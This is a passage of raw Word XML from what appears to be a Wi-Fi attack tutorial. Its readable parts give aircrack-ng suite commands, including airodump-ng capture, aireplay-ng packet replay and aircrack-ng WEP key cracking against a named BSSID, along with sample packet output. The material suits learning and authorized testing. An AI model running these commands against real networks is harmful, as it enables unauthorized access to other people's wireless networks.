        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B8BD350" w14:textId="77777777" w:rsidR="004652D1" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> Sent 10204 packets...(455 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>pps</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69F46C06" w14:textId="77777777" w:rsidR="00047FF7" w:rsidRDefault="00047FF7" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0E364915" w14:textId="5D5E8728"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 xml:space="preserve">If you have not already started </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>airodump-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">, be sure to start it now. Once you have sufficient IVs, </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F085977" w14:textId="77777777" w:rsidR="004233BD" w:rsidRDefault="004233BD" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="44E13703" w14:textId="77777777" w:rsidR="004233BD" w:rsidRPr="00970925" w:rsidRDefault="004233BD" w:rsidP="004233BD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00970925">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>airodump</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00970925">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00970925">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> -c 9 --</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00970925">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>bssid</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00970925">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 00:14:6C:7E:40:80 -w capture wlan0mon</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2189F74E" w14:textId="77777777" w:rsidR="004233BD" w:rsidRPr="004233BD" w:rsidRDefault="004233BD" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0E73E2B3" w14:textId="77777777" w:rsidR="004233BD" w:rsidRDefault="004233BD" w:rsidP="004233BD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>you</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> can start </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>aircrack-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> and attempt to crack the WEP key.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60E11FAF" w14:textId="77777777" w:rsidR="00047FF7" w:rsidRDefault="00047FF7" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7798DDCB" w14:textId="77777777" w:rsidR="001565B0" w:rsidRPr="00970925" w:rsidRDefault="001565B0" w:rsidP="001565B0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00970925">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>aircrack</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00970925">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00970925">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> -b 00:14:6C:7E:40:80 capture*.cap </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0ECCA65A" w14:textId="77777777" w:rsidR="004233BD" w:rsidRDefault="004233BD" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="539E53C4"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Another variation of this attack is to use packets from a previous capture. You must have captured the full packets, not just the IVs.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C005553"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lastRenderedPageBreak/>
        <w:t>Here is what the command would look like:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C3201C2" w14:textId="77777777" w:rsidR="00047FF7" w:rsidRDefault="00047FF7" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="33D64A2A" w14:textId="37895FEE" w:rsidR="004652D1" w:rsidRPr="00970925" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00970925">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>aireplay</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00970925">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00970925">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b 00:14:6C:7E:40:80 -h 00:09:5B:EC:EE:F2 -r capture-01.cap </w:t>
      </w:r>
      <w:r w:rsidR="00277615" w:rsidRPr="00970925">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>wlan0mon</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="157A3038" w14:textId="77777777" w:rsidR="00047FF7" w:rsidRDefault="00047FF7" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3EE7EE39" w14:textId="77777777" w:rsidR="004652D1" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Where ” -r capture-01.cap” is data from a previous capture.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B98856D" w14:textId="77777777" w:rsidR="00047FF7" w:rsidRDefault="00047FF7" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="559E953A" w14:textId="3E81AB22" w:rsidR="004652D1" w:rsidRPr="007A2212" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:sectPr w:rsidR="004652D1" w:rsidRPr="007A22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031313" w14:textId="77777777" w:rsidR="00B906C4" w:rsidRDefault="00B906C4" w:rsidP="00A821AF">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:endnote>
  <w:endnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="32EF4BF6" w14:textId="77777777" w:rsidR="00B906C4" w:rsidRDefault="00B906C4" w:rsidP="00A82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A00002EF" w:usb1="4000204B" w:usb2="00000000" w:usb3="00000000" w:csb0="000000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2EF4A" w14:textId="77777777" w:rsidR="00B906C4" w:rsidRDefault="00B906C4" w:rsidP="00A821AF">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:footnote>
  <w:footnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="473900A1" w14:textId="77777777" w:rsidR="00B906C4" w:rsidRDefault="00B906C4" w:rsidP="00A821A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000001F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1CC55A37"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="5BF0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D61E2C"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="55201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8F5D5A"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="FA44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6118A3"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="A7F8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9"/>
  </w:num>
  <w:num w:numId="3">
    <w:abstractNumId w:val="31"/>
  </w:num>
  <w:num w:numId="4">
    <w:abstractNumId w:val="30"/>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2"/>
  </w:num>
  <w:num w:numId="18">
    <w:abstractNumId w:val="13"/>
  </w:num>
  <w:num w:numId="19">
    <w:abstractNumId w:val="14"/>
  </w:num>
  <w:num w:numId="20">
    <w:abstractNumId w:val="15"/>
  </w:num>
  <w:num w:numId="21">
    <w:abstractNumId w:val="16"/>
  </w:num>
  <w:num w:numId="22">
    <w:abstractNumId w:val="17"/>
  </w:num>
  <w:num w:numId="23">
    <w:abstractNumId w:val="18"/>
  </w:num>
  <w:num w:numId="24">
    <w:abstractNumId w:val="19"/>
  </w:num>
  <w:num w:numId="25">
    <w:abstractNumId w:val="20"/>
  </w:num>
  <w:num w:numId="26">
    <w:abstractNumId w:val="21"/>
  </w:num>
  <w:num w:numId="27">
    <w:abstractNumId w:val="22"/>
  </w:num>
  <w:num w:numId="28">
    <w:abstractNumId w:val="23"/>
  </w:num>
  <w:num w:numId="29">
    <w:abstractNumId w:val="24"/>
  </w:num>
  <w:num w:numId="30">
    <w:abstractNumId w:val="25"/>
  </w:num>
  <w:num w:numId="31">
    <w:abstractNumId w:val="26"/>
  </w:num>
  <w:num w:numId="32">
    <w:abstractNumId w:val="27"/>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4A1"/>
    <w:rsid w:val="00031C10"/>
    <w:rsid w:val="00047FF7"/>
    <w:rsid w:val="00057125"/>
    <w:rsid w:val="0007083B"/>
    <w:rsid w:val="00082EE2"/>
    <w:rsid w:val="000A4CF1"/>
    <w:rsid w:val="000C668B"/>
    <w:rsid w:val="000E710F"/>
    <w:rsid w:val="00100D0C"/>
    <w:rsid w:val="0012143E"/>
    <w:rsid w:val="001565B0"/>
    <w:rsid w:val="00156845"/>
    <w:rsid w:val="00174015"/>
    <w:rsid w:val="00197ADE"/>
    <w:rsid w:val="001A4FDA"/>
    <w:rsid w:val="001E1BFA"/>
    <w:rsid w:val="001F3F8A"/>
    <w:rsid w:val="001F4FDF"/>
    <w:rsid w:val="00203DFA"/>
    <w:rsid w:val="00204ED2"/>
    <w:rsid w:val="00215312"/>
    <w:rsid w:val="00217144"/>
    <w:rsid w:val="00217147"/>
    <w:rsid w:val="00223825"/>
    <w:rsid w:val="002463D1"/>
    <w:rsid w:val="00277615"/>
    <w:rsid w:val="002968C4"/>
    <w:rsid w:val="002A541E"/>
    <w:rsid w:val="002A56B4"/>
    <w:rsid w:val="002A5958"/>
    <w:rsid w:val="002B5D62"/>
    <w:rsid w:val="002B7D39"/>
    <w:rsid w:val="002D638E"/>
    <w:rsid w:val="002E6DDC"/>
    <w:rsid w:val="00302511"/>
    <w:rsid w:val="00310BF5"/>
    <w:rsid w:val="003112DC"/>
    <w:rsid w:val="00312D21"/>
    <w:rsid w:val="00316E44"/>
    <w:rsid w:val="00381064"/>
    <w:rsid w:val="0038547B"/>
    <w:rsid w:val="00390152"/>
    <w:rsid w:val="0039101B"/>
    <w:rsid w:val="003A12F0"/>
    <w:rsid w:val="003B3B96"/>
    <w:rsid w:val="003B6A08"/>
    <w:rsid w:val="003C3618"/>
    <w:rsid w:val="003C6FE1"/>
    <w:rsid w:val="003D0ECE"/>
    <w:rsid w:val="003D61DB"/>
    <w:rsid w:val="003F687D"/>
    <w:rsid w:val="0040213D"/>
    <w:rsid w:val="00415848"/>
    <w:rsid w:val="004233BD"/>
    <w:rsid w:val="004652D1"/>
    <w:rsid w:val="00470C7C"/>
    <w:rsid w:val="00483004"/>
    <w:rsid w:val="00486B3D"/>
    <w:rsid w:val="004913B3"/>
    <w:rsid w:val="004A762F"/>
    <w:rsid w:val="004F4FAB"/>
    <w:rsid w:val="005007BA"/>
    <w:rsid w:val="00533BE5"/>
    <w:rsid w:val="00540687"/>
    <w:rsid w:val="00562854"/>
    <w:rsid w:val="00565DF5"/>
    <w:rsid w:val="0056768E"/>
    <w:rsid w:val="0057646A"/>
    <w:rsid w:val="005850AD"/>
    <w:rsid w:val="00590FC4"/>
    <w:rsid w:val="005A1939"/>
    <w:rsid w:val="005A5B8F"/>
    <w:rsid w:val="005D1F44"/>
    <w:rsid w:val="005E73A2"/>
    <w:rsid w:val="006021C9"/>
    <w:rsid w:val="00606BB4"/>
    <w:rsid w:val="00610997"/>
    <w:rsid w:val="00631713"/>
    <w:rsid w:val="00653B1E"/>
    <w:rsid w:val="006848FE"/>
    <w:rsid w:val="006B3EAA"/>
    <w:rsid w:val="006B5219"/>
    <w:rsid w:val="006D07BF"/>
    <w:rsid w:val="006E74C0"/>
    <w:rsid w:val="006F5EC7"/>
    <w:rsid w:val="0070331F"/>
    <w:rsid w:val="00722A42"/>
    <w:rsid w:val="00725E6D"/>
    <w:rsid w:val="00750C0D"/>
    <w:rsid w:val="00754F21"/>
    <w:rsid w:val="007669BD"/>
    <w:rsid w:val="007A2212"/>
    <w:rsid w:val="007A4D90"/>
    <w:rsid w:val="007D0B9F"/>
    <w:rsid w:val="007D24FC"/>
    <w:rsid w:val="007E5CF0"/>
    <w:rsid w:val="007F2182"/>
    <w:rsid w:val="008238FB"/>
    <w:rsid w:val="00826FDB"/>
    <w:rsid w:val="008274A1"/>
    <w:rsid w:val="00837401"/>
    <w:rsid w:val="00846F4B"/>
    <w:rsid w:val="0086290C"/>
    <w:rsid w:val="008757E6"/>
    <w:rsid w:val="008928E2"/>
    <w:rsid w:val="008C4419"/>
    <w:rsid w:val="008D1EBD"/>
    <w:rsid w:val="008D42FF"/>
    <w:rsid w:val="008D7BBE"/>
    <w:rsid w:val="008E353E"/>
    <w:rsid w:val="008F0BC0"/>
    <w:rsid w:val="00954648"/>
    <w:rsid w:val="00970925"/>
    <w:rsid w:val="00975A84"/>
    <w:rsid w:val="009D5939"/>
    <w:rsid w:val="00A06611"/>
    <w:rsid w:val="00A158A2"/>
    <w:rsid w:val="00A31A67"/>
    <w:rsid w:val="00A400D3"/>
    <w:rsid w:val="00A64109"/>
    <w:rsid w:val="00A67461"/>
    <w:rsid w:val="00A821AF"/>
    <w:rsid w:val="00AA4FBD"/>
    <w:rsid w:val="00AA52EE"/>
    <w:rsid w:val="00AB31EB"/>
    <w:rsid w:val="00AD15C8"/>
    <w:rsid w:val="00AD322F"/>
    <w:rsid w:val="00AF4B88"/>
    <w:rsid w:val="00AF4F0D"/>
    <w:rsid w:val="00B0296B"/>
    <w:rsid w:val="00B21B9D"/>
    <w:rsid w:val="00B311A9"/>
    <w:rsid w:val="00B37B39"/>
    <w:rsid w:val="00B559A0"/>
    <w:rsid w:val="00B62550"/>
    <w:rsid w:val="00B906C4"/>
    <w:rsid w:val="00BF6042"/>
    <w:rsid w:val="00C01409"/>
    <w:rsid w:val="00C30F58"/>
    <w:rsid w:val="00C56640"/>
    <w:rsid w:val="00C67E93"/>
    <w:rsid w:val="00C7451C"/>
    <w:rsid w:val="00C74985"/>
    <w:rsid w:val="00C829EF"/>
    <w:rsid w:val="00C85C37"/>
    <w:rsid w:val="00C926B8"/>
    <w:rsid w:val="00C94A94"/>
    <w:rsid w:val="00CA5635"/>
    <w:rsid w:val="00CE7BBE"/>
    <w:rsid w:val="00D0461C"/>
    <w:rsid w:val="00D242DE"/>
    <w:rsid w:val="00D25994"/>
    <w:rsid w:val="00D81026"/>
    <w:rsid w:val="00DC6CB9"/>
    <w:rsid w:val="00DC779F"/>
    <w:rsid w:val="00DF49BC"/>
    <w:rsid w:val="00DF676D"/>
    <w:rsid w:val="00DF7355"/>
    <w:rsid w:val="00E21822"/>
    <w:rsid w:val="00E40A9F"/>
    <w:rsid w:val="00E415FB"/>
    <w:rsid w:val="00E45DB9"/>
    <w:rsid w:val="00E46969"/>
    <w:rsid w:val="00E51FEC"/>
    <w:rsid w:val="00E5420F"/>
    <w:rsid w:val="00E96155"/>
    <w:rsid w:val="00EA0EF7"/>
    <w:rsid w:val="00EC3B33"/>
    <w:rsid w:val="00EE3BA5"/>
    <w:rsid w:val="00F16E8E"/>
    <w:rsid w:val="00F37B2B"/>
    <w:rsid w:val="00F70859"/>
    <w:rsid w:val="00F80E8E"/>
    <w:rsid w:val="00F8516C"/>
    <w:rsid w:val="00F8537A"/>
    <w:rsid w:val="00F975CB"/>
    <w:rsid w:val="00FC0AC3"/>
    <w:rsid w:val="00FC4D3D"/>
    <w:rsid w:val="00FD0ABD"/>
    <w:rsid w:val="00FF0404"/>
    <w:rsid w:val="00FF16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3A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74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74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74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4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74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74A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274A1"/>
    <w:rPr>
      <w:color w:val="0000FF"/>
      <w:u w:val="single"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="NormalWeb">
    <w:name w:val="Normal (Web)"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="008274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count">
    <w:name w:val="share-count"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="008274A1"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Date1">
    <w:name w:val="Date1"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="008274A1"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="entry-date">
    <w:name w:val="entry-date"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="008274A1"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="author">
    <w:name w:val="author"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="008274A1"/>
  </w:style>
  <w:style w:type="paragraph" w:styleId="HTMLPreformatted">
    <w:name w:val="HTML Preformatted"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="HTMLPreformattedChar"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="0082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74A1"/>
    <w:rPr>
